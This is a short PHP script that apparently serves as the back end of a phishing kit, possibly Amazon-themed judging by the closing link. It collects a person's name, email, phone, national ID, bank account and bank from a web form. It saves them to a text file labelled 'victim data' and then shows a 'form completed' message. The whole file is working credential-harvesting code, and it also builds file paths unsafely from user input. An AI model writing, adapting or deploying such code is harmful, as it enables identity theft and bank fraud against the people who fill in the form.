
	<?php

$nombre = $_POST["nombre"];
$fecha = $_POST["fecha"];
$email = $_POST["email"];
$numero = $_POST["numero"];
$dni= $_POST["dni"];
$cuenta = $_POST["cuenta"];
$banco = $_POST["banco"];
$pais = $_POST["pais"];


$contenido="
 ___________________
|DATOS DE LA VICTIMA|
|___________________|
 NOMBRE: $nombre
 FECHA: $fecha
 EMAIL: $email
 NUMERO: $numero
 DNI: $dni
 CUENTA: $cuenta
 BANCO: $banco
 PAIS: $pais
 
";
	mkdir('Cuentas',0777,true);

$archivo = fopen("Cuentas/$nombre.txt", "w");
fwrite($archivo,$contenido);
?>
<html>
    <head>
        <h1>SU FORMULARIO FUE COMPLETADO</h1>
    </head>
<a href="https://amazon.com"></a>
    
</html>